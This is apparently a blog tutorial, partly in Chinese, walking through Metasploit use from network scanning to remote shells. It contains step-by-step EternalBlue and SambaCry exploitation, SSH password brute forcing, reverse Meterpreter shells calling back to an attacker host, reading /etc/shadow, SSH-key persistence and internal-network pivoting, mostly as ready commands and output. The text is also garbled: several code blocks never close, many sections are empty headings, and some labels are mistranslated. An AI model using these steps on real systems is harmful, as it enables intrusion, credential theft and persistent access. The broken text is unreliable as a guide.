---
title: "Metasploit framework in-depth practice - from scanning to getshell"
url: "en/metasploit-deep-dive"
date: "2026-01-15"
draft: false
summary: "Metasploit complete practical tutorial, module architecture analysis, EternalBlue utilization process, Meterpreter and MSFvenom"
authors: ["default"]
tags:
  - Metasploit
  - exploit
  - Meterpreter
images: ["https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1200&q=80"]
categories:
  - Penetration testing
---

# Metasploit framework in-depth practice - from scanning to getshell

Metasploit Framework is the world's most widely used penetration testing framework, created by HD Moore in 2003 and today maintained by Rapid7. It integrates all aspects of penetration testing - information collection, vulnerability exploitation, post-penetration, report generation - into a unified platform, greatly improving the efficiency of penetration testing. This article will start with the architectural design of Metasploit, delve into its core modules, actual utilization processes, Meterpreter session management and automated attack technology, and take you through a complete penetration testing process from scanning to getshell.

## Metasploit architecture overview

Metasploit Framework adopts a modular architecture, and each component performs its own duties:

### Core module types

| Module Type | Description | Example Path |
|----------|------|----------|
| **Exploit** | Exploit module | `exploit/windows/smb/ms17_010_eternalblue` |
| **Payload** | Attack payload (rebound Shell, etc.) | `payload/linux/x64/shell_reverse_tcp` |
| **Auxiliary** | Auxiliary modules (scanning, sniffing, etc.) | `auxiliary/scanner/portscan/tcp` |
| **Post** | Post-exploitation module | `post/linux/gather/hashdump` |
| **Encoder** | Encoder (bypass detection) | `encoder/x86/shikata_ga_nai` |
| **NOP** | NOP skateboard generator | `nop/x86/opty2` |
| **Evasion** | Anti-virus module | `evasion/windows/windows_defender_exe` |

### Detailed explanation of Payload type

```bash
# Payload 分为三大类:

# 1. Singles (单一载荷) — 独立运行，体积小
# 命名格式: <platform>/[arch]/<single>
# 例如: linux/x64/shell_reverse_tcp

# 2. Stagers (传输器) — 建立连接通道，下载 Stage
# 命名格式: 带 '/' 分隔
# 例如: windows/x64/meterpreter/reverse_tcp
#                              ^stager

# 3. Stages (传输阶段) — 通过 Stager 下载的大型载荷
# 如 Meterpreter、VNC 注入等

# 区分方法:
# shell_reverse_tcp     → Single (无 '/' 分隔)
# shell/reverse_tcp     → Staged (有 '/' 分隔 stager)
# meterpreter/reverse_tcp → Staged Meterpreter
```

## msfconsole 基本使用

### 启动与核心命令

```bash
# 启动 Metasploit（首次启动需要初始化数据库）
sudo msfdb init
msfconsole

# Check database connection

# Core navigation commands

# Workspace management (isolating different projects)

### Module search techniques

```bash
# 基本搜索
msf6 > search eternalblue
msf6 > search apache
msf6 > search type:exploit platform:linux

# 高级搜索过滤
msf6 > search type:exploit name:smb
msf6 > search type:auxiliary name:scanner
msf6 > search cve:2021-44228              # 按CVE搜索
msf6 > search platform:linux type:exploit rank:excellent
msf6 > search author:hdm

# 搜索结果字段说明
# Name: 模块名称
# Disclosure Date: 漏洞公开日期
# Rank: 可靠性等级 (excellent > great > good > normal > average > low)
# Check: 是否支持 check 命令（非破坏性检测）

# 在 Exploit-DB 中搜索（离线）
searchsploit eternalblue
searchsploit -m 42315           # 复制 exploit 到当前目录
```

## 信息收集模块实战

Metasploit 的 Auxiliary 模块包含大量信息收集功能。

### 端口扫描

```bash
# TCP 端口扫描
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(tcp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(tcp) > set PORTS 1-1000
msf6 auxiliary(tcp) > set THREADS 50
msf6 auxiliary(tcp) > run

# SYN scan

### Service version detection

```bash
# SMB 版本探测
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(smb_version) > run

# SSH 版本探测
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(ssh_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(ssh_version) > run

# FTP 版本探测
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 auxiliary(ftp_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(ftp_version) > run

# HTTP 服务器信息
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(http_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(http_version) > run

# 查看数据库中收集到的信息
msf6 > hosts                    # 查看发现的主机
msf6 > services                 # 查看发现的服务
msf6 > services -p 445          # 过滤特定端口
msf6 > vulns                    # 查看发现的漏洞
```

### 服务枚举

```bash
# SMB 共享枚举
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(smb_enumshares) > set RHOSTS 192.168.1.100
msf6 auxiliary(smb_enumshares) > run

# SMB user enumeration

# FTP anonymous login detection

# SNMP enumeration

# HTTP directory scan

### Vulnerability detection

```bash
# MS17-010 (EternalBlue) 漏洞检测
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(smb_ms17_010) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(smb_ms17_010) > run

# Shellshock 漏洞检测
msf6 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
msf6 auxiliary(apache_mod_cgi_bash_env) > set RHOSTS 192.168.1.100
msf6 auxiliary(apache_mod_cgi_bash_env) > set TARGETURI /cgi-bin/
msf6 auxiliary(apache_mod_cgi_bash_env) > run

# SSH 暴力破解
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(ssh_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(ssh_login) > set USERNAME root
msf6 auxiliary(ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(ssh_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(ssh_login) > set THREADS 10
msf6 auxiliary(ssh_login) > run
```

## 漏洞利用实战 — MS17-010 (EternalBlue) 完整流程

EternalBlue（永恒之蓝）是 2017 年被 Shadow Brokers 泄露的 NSA 漏洞利用工具，利用 Windows SMB 协议漏洞实现远程代码执行。以下是使用 Metasploit 的完整利用过程。

### 步骤一：目标发现与漏洞确认

```bash
# 1. 扫描目标网段，发现开放 445 端口的主机
msf6 > db_nmap -sS -sV -p 445 192.168.1.0/24

# 2. Confirm MS17-010 vulnerability

# [+] 192.168.1.100:445 - Host is likely VULNERABLE to MS17-010!

### Step 2: Configure and execute the exploit

```bash
# 3. 使用 EternalBlue 利用模块
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 4. 查看模块信息
msf6 exploit(ms17_010_eternalblue) > info

# 5. 查看并配置选项
msf6 exploit(ms17_010_eternalblue) > show options

# 6. 设置目标 IP
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# 7. 设置攻击载荷（Meterpreter）
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 8. 设置回连地址
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# 9. 可选：使用 check 命令验证（非破坏性）
msf6 exploit(ms17_010_eternalblue) > check

# 10. 执行攻击
msf6 exploit(ms17_010_eternalblue) > exploit

# [*] Started reverse TCP handler on 192.168.1.50:4444
# [*] Sending exploit packet...
# [*] Sending stage (200774 bytes) to 192.168.1.100
# [*] Meterpreter session 1 opened
# meterpreter >
```

### Linux 目标利用示例（SambaCry）

```bash
# 利用 Samba is_known_pipename 漏洞
msf6 > use exploit/linux/samba/is_known_pipename
msf6 exploit(is_known_pipename) > set RHOSTS 192.168.1.100
msf6 exploit(is_known_pipename) > set PAYLOAD linux/x64/shell_reverse_tcp
msf6 exploit(is_known_pipename) > set LHOST 192.168.1.50
msf6 exploit(is_known_pipename) > set TARGET 3
msf6 exploit(is_known_pipename) > exploit
```

## Meterpreter session management and common commands

Meterpreter is the most powerful payload of Metasploit. It runs in memory and provides rich post-exploitation functions.

### Basic system commands

```bash
# 系统信息
meterpreter > sysinfo           # 系统信息
meterpreter > getuid            # 当前用户
meterpreter > getpid            # 当前进程ID
meterpreter > ps                # 列出进程
meterpreter > shell             # 进入系统 shell
meterpreter > exit              # 退出 shell 回到 meterpreter

# 文件操作
meterpreter > pwd               # 当前目录
meterpreter > ls                # 列出文件
meterpreter > cd /tmp           # 切换目录
meterpreter > cat /etc/passwd   # 读取文件
meterpreter > download /etc/shadow /tmp/shadow    # 下载文件
meterpreter > upload /tmp/tool.sh /tmp/           # 上传文件
meterpreter > edit /tmp/file.txt                  # 编辑文件
meterpreter > mkdir /tmp/test                     # 创建目录
meterpreter > rm /tmp/test.txt                    # 删除文件

# 网络信息
meterpreter > ipconfig / ifconfig    # 网络接口
meterpreter > netstat                # 网络连接
meterpreter > route                  # 路由表
meterpreter > arp                    # ARP 表
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.20  # 端口转发
```

### 权限与提权

```bash
# 检查权限
meterpreter > getuid
meterpreter > getsystem          # 尝试自动提权

# Use local privilege escalation module

msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(local_exploit_suggester) > set SESSION 1
msf6 post(local_exploit_suggester) > run

# Use specific privilege escalation modules as recommended

### Session management

```bash
# 后台化当前会话
meterpreter > background
# 或按 Ctrl+Z

# 查看所有会话
msf6 > sessions
msf6 > sessions -l              # 列出所有会话

# 进入指定会话
msf6 > sessions -i 1            # 进入会话1

# 在会话上运行单个命令
msf6 > sessions -C "sysinfo" -i 1

# 升级 Shell 到 Meterpreter
msf6 > sessions -u 1            # 将普通 shell 升级为 meterpreter

# 结束会话
msf6 > sessions -k 1            # 终止会话1
msf6 > sessions -K              # 终止所有会话

# 多会话管理
msf6 > sessions -l
# Active sessions
# ===============
# Id  Type                   Information              Connection
# --  ----                   -----------              ----------
# 1   meterpreter x64/linux  root @ target1           192.168.1.50:4444 -> 192.168.1.100:41832
# 2   shell x64/linux                                  192.168.1.50:4445 -> 192.168.1.101:39211
```

## 后渗透模块

Metasploit 的 Post 模块提供了丰富的后渗透功能。

### 信息收集

```bash
# 收集系统信息
msf6 > use post/linux/gather/enum_system
msf6 post(enum_system) > set SESSION 1
msf6 post(enum_system) > run

# Collect network information

# Collect user and password hashes

# Find sensitive files

# Collect SSH credentials

# Database credential collection

### Privilege escalation module

```bash
# 本地提权建议
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(local_exploit_suggester) > set SESSION 1
msf6 post(local_exploit_suggester) > set SHOWDESCRIPTION true
msf6 post(local_exploit_suggester) > run

# 常见 Linux 提权模块
msf6 > use exploit/linux/local/cve_2022_0847_dirtypipe
msf6 > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
msf6 > use exploit/linux/local/sudo_baron_samedit
msf6 > use exploit/linux/local/overlayfs_priv_esc
```

### 持久化模块

```bash
# SSH 密钥持久化
msf6 > use post/linux/manage/sshkey_persistence
msf6 post(sshkey_persistence) > set SESSION 1
msf6 post(sshkey_persistence) > set USERNAME root
msf6 post(sshkey_persistence) > run

# Cron persistence

# Service persistence

### Intranet routing and springboard

```bash
# 添加路由（通过已控主机访问内网）
meterpreter > run autoroute -s 10.10.10.0/24

# 或在 msf 中手动添加
msf6 > route add 10.10.10.0/24 1    # 通过 session 1

# 查看路由表
msf6 > route print

# 设置 SOCKS 代理
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > set VERSION 5
msf6 auxiliary(socks_proxy) > run -j

# 现在可以通过代理扫描内网
# 配置 proxychains 使用 socks5 127.0.0.1 1080
# proxychains nmap -sT -Pn 10.10.10.0/24

# 通过跳板扫描内网
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(tcp) > set RHOSTS 10.10.10.0/24
msf6 auxiliary(tcp) > set PORTS 22,80,443,445,3389
msf6 auxiliary(tcp) > set THREADS 20
msf6 auxiliary(tcp) > run
```

## MSFvenom — Payload 生成器

MSFvenom 是 Metasploit 的独立 Payload 生成工具，可以创建各种格式的攻击载荷。

```bash
# 查看所有可用 Payload
msfvenom -l payloads

# View all available encoders

# View all output formats

# === Linux Payload ===

# Linux Rebound Shell (ELF)

# Linux Meterpreter (ELF)

# === Web Payload ===

# PHP bounce shell

# Python bounce shell

# JSP bounce shell

# WAR package (for Tomcat)

# ASP bounce shell

# === Windows Payload ===

# Windows Meterpreter (EXE)

# Windows Shellcode (for buffer overflow)

# === Encoding Bypass ===

# Encoding using shikata_ga_nai (multiple iterations)

# Multiple coding

# exclude bad characters

### Execute the payload on the target

```bash
# 攻击机设置监听
msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(handler) > set LHOST 0.0.0.0
msf6 exploit(handler) > set LPORT 4444
msf6 exploit(handler) > exploit -j    # -j 后台运行

# 目标机执行 Payload
chmod +x meterpreter.elf
./meterpreter.elf

# 攻击机收到连接
# [*] Meterpreter session 1 opened
msf6 > sessions -i 1
```

## 自动化攻击 — Resource Script

Resource Script 是 Metasploit 的自动化脚本，可以将一系列命令保存为脚本文件自动执行。

### 创建 Resource Script

```bash
# 创建扫描脚本 scan.rc
cat > scan.rc << 'EOF'
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
set THREADS 50
run

use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set THREADS 50
run

use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
set THREADS 50
run
EOF

# Execute scan script

### Automated exploit scripts

```bash
# 创建利用脚本 exploit.rc
cat > exploit.rc << 'EOF'
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444
exploit -j -z

# 等待会话建立后自动执行后渗透
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
EOF

# 执行
msfconsole -r exploit.rc
```

### 自动化后渗透脚本

```bash
# 创建后渗透脚本 post.rc
cat > post.rc << 'EOF'
# 系统信息收集
use post/linux/gather/enum_system
set SESSION 1
run

# Network information

# Password hash

# Configuration file

msfconsole -r post.rc
```

### Record and playback in msfconsole

```bash
# 录制操作（保存为 Resource Script）
msf6 > makerc /tmp/my_session.rc

# 在 msfconsole 中加载 Resource Script
msf6 > resource /tmp/my_session.rc

# 启动时加载
msfconsole -r /tmp/my_session.rc
```

## 实战综合案例：完整渗透流程

以下是一个完整的渗透测试流程示例：

```bash
# ====== 阶段一：信息收集 ======
msfconsole -q

# Initialize workspace

# View scan results

# ====== Phase 2: Vulnerability Discovery ======

# ====== Phase Three: Vulnerability Exploitation ======

# ====== Stage 4: Post-infiltration ======

# Upload tool

# ====== Stage Five: Lateral Movement ======

# ====== Stage 6: Data Export ======

## Security recommendations and defensive measures

1. **Timely patching**: Metasploit mostly exploits known vulnerabilities. Timely updating of systems and software can prevent the vast majority of attacks.

## Summarize

This article completely demonstrates the entire process of Metasploit Framework from architectural design to practical utilization. We started with the module system of Metasploit and learned in depth how to use msfconsole, information collection module, vulnerability exploitation process (taking EternalBlue as an example), Meterpreter session management, post-exploitation module, MSFvenom Payload generation and Resource Script automated attacks. Metasploit is the "Swiss Army Knife" of penetration testing. Mastering it can greatly improve the efficiency and depth of penetration testing. However, tools are only means. Understanding vulnerability principles, attack chain logic and defense ideas is the core competitiveness of security practitioners. This series of penetration testing articles has come to an end. I hope these six articles can help you establish a complete penetration testing knowledge system and continue to hone your skills and improve your capabilities within the scope of legal authorization.

